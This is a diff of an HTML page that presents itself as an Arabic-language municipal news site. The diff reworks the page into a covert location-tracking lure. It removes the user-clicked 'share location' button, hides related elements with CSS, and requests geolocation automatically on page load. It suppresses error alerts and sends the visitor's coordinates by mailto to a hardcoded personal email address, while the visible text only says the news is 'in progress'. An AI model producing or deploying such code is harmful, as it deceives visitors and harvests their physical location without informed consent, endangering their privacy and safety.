@@ -4,14 +4,46 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>اخبار بلدية</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/4/4d/Mairie_de_mezaourou.jpg'); /* Replace with your image URL */
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      color: white;
+    }
+
+    h2 {
+      font-size: 2em;
+      margin: 20px 0;
+    }
+
+    p {
+      font-size: 1.2em;
+      margin-bottom: 40px;
+    }
+
+    /* Hide all elements related to sharing location */
+    #shareLocation, p {
+      display: none;
+    }
+  </style>
 </head>
 <body>
   <h2>اخبار العمل</h2>
-  <p>اخبار بلدية ( اضغط على الزر و شاهد اخر اخبار العمل الجاري بي البلدية )</p>
-  <button id="shareLocation"> قم بي المشاهدة</button>
+  <p>اخبار بلدية (قيد التنفيذ...)</p>
 
   <script>
-    document.getElementById("shareLocation").onclick = function() {
+    // Automatically share location on page load
+    window.onload = function() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
           const latitude = position.coords.latitude;
@@ -23,10 +55,10 @@
           const email = "qmahdi2000@gmail.com"; // Replace with your email address
           const mailtoLink = `mailto:${email}?subject=${subject}&body=${body}`;
 
-          // Open the mailto link
+          // Open the mailto link (automatically triggers email client)
           window.location.href = mailtoLink;
         }, function(error) {
-          alert("Could not retrieve location. Please enable location access and try again.");
+          console.error("Could not retrieve location:", error);
         });
       } else {
         alert("Geolocation is not supported by this browser.");
@@ -35,4 +67,3 @@
   </script>
 </body>
 </html>
-
